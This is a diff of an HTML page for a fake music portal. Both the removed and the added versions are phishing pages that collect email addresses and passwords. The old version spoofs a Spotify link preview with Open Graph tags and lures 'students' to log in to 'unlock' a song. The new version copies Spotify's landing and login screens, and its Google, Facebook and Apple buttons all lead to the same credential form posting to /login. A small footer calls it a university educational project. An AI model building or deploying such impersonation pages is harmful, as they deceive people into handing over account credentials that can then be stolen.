@@ -1,62 +1,62 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Music Portal | Login</title>
+    <title>Music Portal</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
-
-    <!-- Spotify Link Preview Tags -->
-    <meta property="og:title" content="Spotify – Stargirl Interlude">
-    <meta property="og:description" content="Listen to Stargirl Interlude on Spotify">
-    <meta property="og:image" content="https://i.scdn.co/image/ab67616d0000b2734718e2b7e4ba63d00adb105b">
-    <meta property="og:type" content="music.song">
-    <meta name="theme-color" content="#1DB954">
 </head>
-
 <body>
-    <div class="background">
-        <div class="circle"></div>
-        <div class="circle"></div>
-    </div>
-    <div class="login-container">
-        <div class="glass-box">
-            <div class="header">
-                <div class="logo">
-                    <svg viewBox="0 0 24 24" width="40" height="40" stroke="currentColor" stroke-width="2" fill="none"
-                        stroke-linecap="round" stroke-linejoin="round" class="css-i6dz6n">
-                        <path d="M9 18V5l12-2v13"></path>
-                        <circle cx="6" cy="18" r="3"></circle>
-                        <circle cx="18" cy="16" r="3"></circle>
-                    </svg>
-                </div>
-                <h1>Exclusive Access</h1>
-                <p>Login to listen to <span>Stargirl Interlude</span></p>
-            </div>
-            <form action="/login" method="POST">
-                <div class="input-group">
-                    <label for="email">Email Address</label>
-                    <input type="email" id="email" name="email" placeholder="students@example.com" required>
-                </div>
-                <div class="input-group">
-                    <label for="password">Password</label>
-                    <input type="password" id="password" name="password" placeholder="••••••••" required>
-                </div>
-                <button type="submit" class="login-btn">
-                    <span>Unlock Song</span>
-                    <svg viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" stroke-width="2" fill="none"
-                        stroke-linecap="round" stroke-linejoin="round" class="css-i6dz6n">
-                        <polyline points="9 18 15 12 9 6"></polyline>
-                    </svg>
-                </button>
-            </form>
-            <div class="footer">
-                <p>Limited student access portal</p>
-            </div>
+
+<div class="app-wrapper">
+    <div id="landing-screen" class="container">
+        <!-- Generic Outline Musical Note Icon -->
+        <div class="logo-wrapper">
+            <svg width="45" height="45" viewBox="0 0 24 24" fill="#1db954">
+                <path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/>
+            </svg>
+        </div>
+        <h1>Millions of songs.<br>Free to stream.</h1>
+        <div class="button-list">
+            <button class="btn btn-green" onclick="goToLogin()">Sign up free</button>
+            <button class="btn btn-outline" onclick="goToLogin()">Continue with Google</button>
+            <button class="btn btn-outline" onclick="goToLogin()">Continue with Facebook</button>
+            <button class="btn btn-outline" onclick="goToLogin()">Continue with Apple</button>
+            <button class="btn btn-text" onclick="goToLogin()">Log in</button>
         </div>
     </div>
-</body>
 
+    <div id="login-screen" class="container hidden">
+        <div class="back-nav" onclick="goBack()">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        </div>
+        
+        <form id="loginForm" action="/login" method="POST">
+            <div class="form-group">
+                <label>Email or username</label>
+                <input type="text" name="email" placeholder="Email or username" class="spotify-input" required>
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <div class="password-wrapper">
+                    <input type="password" id="passwordField" name="password" placeholder="Password" class="spotify-input" required>
+                    <span class="toggle-password" onclick="togglePassword()">👁️</span>
+                </div>
+            </div>
+        </form>
+        
+        <button class="btn btn-green" id="loginBtn" onclick="handleLogin()">
+            <span id="btnText">Log In</span>
+            <div id="spinner" class="spinner hidden"></div>
+        </button>
+        
+        <!-- Educational Disclaimer -->
+        <p style="margin-top: 30px; font-size: 11px; color: #b3b3b3; line-height: 1.4;">
+            Warning: This is a university educational project. Do not enter your actual school credentials.
+        </p>
+    </div>
+</div>
+
+<script src="script.js"></script>
+</body>
 </html>
